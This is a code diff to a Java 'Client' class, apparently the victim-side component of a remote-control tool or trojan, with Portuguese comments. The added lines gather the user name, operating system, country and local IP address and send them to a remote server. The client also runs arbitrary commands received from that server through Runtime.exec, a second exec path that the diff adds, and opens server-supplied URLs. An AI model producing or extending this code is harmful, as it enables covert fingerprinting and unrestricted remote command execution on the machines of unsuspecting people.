@@ -28,10 +28,19 @@ public class Client {
 
         ouw = new OutputStreamWriter(ou);
         bfw = new BufferedWriter(ouw);
+        //Nome de usuario no pc
+        String osUser = System.getProperty("user.name");
+        //Sistema Operacional
+        String osName = System.getProperty("os.name");
+        //Pais de origem
+        String osCountry = System.getProperty("user.country");
 
         InetAddress ipAddress = InetAddress.getLocalHost();
+        //Ip local da máquina
+        String ipUser = ipAddress.getHostAddress();
 
-        bfw.write(ipAddress.getHostAddress() + "\r\n");
+
+        bfw.write("[" + osCountry + "]" + osUser + " - " + osName + " - [" + ipUser +"]\r\n+");
         //enviarMensagem("Computer IP: " + ipAddress.getHostAddress() + " Connected");
         bfw.flush();
     }
@@ -66,16 +75,19 @@ public class Client {
                 switch (Integer.parseInt(msgFormatted[0])) {
                     case 0 :
                         Runtime.getRuntime().exec(msgFormatted[1]);
+                        sendMessage("Computador programado para desligar!");
                         break;
                     case 1 :
                         try {
                             java.awt.Desktop.getDesktop().browse(new URI(msgFormatted[1]));
+                            sendMessage("Site " + msgFormatted[1] + " aberto!");
                         }catch (Exception e) {
                             e.printStackTrace();
                             sendMessage(e.getMessage());
                         }
                         break;
                     case 2 :
+                        Runtime.getRuntime().exec(msgFormatted[1]);
                         break;
                     case 3 :
                         break;
